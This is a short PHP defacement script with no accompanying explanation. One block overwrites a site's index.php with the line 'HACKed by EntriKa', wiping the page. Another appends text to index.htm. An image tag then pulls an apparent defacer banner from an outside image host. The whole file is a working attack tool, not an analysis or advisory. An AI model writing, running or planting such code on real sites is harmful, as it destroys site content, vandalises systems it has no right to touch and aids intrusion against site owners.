<?php
$entry_line="HACKed by EntriKa";
$fp = fopen("index.php", "w");
fputs($fp, $entry_line);
fclose($fp);
?>

<? 
$fp =@fopen("index.htm", "a+");
$yazi = "test" . "\r\n";
fwrite ($fp, "$yazi");
fclose ($fp);
?>
<img src='http://resimyukle.me/server/php/files/ef1bd4c1a4f70c8488bf7c6893a54664/copyright1.png'/>